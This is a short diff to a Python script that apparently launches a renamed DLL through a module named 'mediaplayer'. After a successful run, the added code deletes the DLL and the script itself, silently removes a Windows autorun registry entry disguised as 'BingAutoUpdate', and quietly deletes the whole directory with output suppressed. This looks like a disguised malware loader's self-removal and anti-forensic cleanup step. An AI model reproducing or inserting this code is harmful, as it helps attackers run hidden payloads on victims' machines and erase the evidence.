@@ -1,8 +1,12 @@
+import subprocess
 import os
 
-target = os.path.dirname(os.path.abspath(__file__)) + "\\target\\release\\client.dll"
+directory = os.path.dirname(os.path.abspath(__file__))
+target = directory + "\\core.dll"
 
 module = __import__("mediaplayer")
-output = module.run(target)
-
-# print(target)
+if module.run(target) == True:
+    os.remove(target)
+    os.remove(__file__)
+    subprocess.Popen(["powershell", "Remove-ItemProperty", "-Path", "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run", "-Name", "BingAutoUpdate"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(["timeout", "3", "&&", "del", "/s", "/q", directory], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
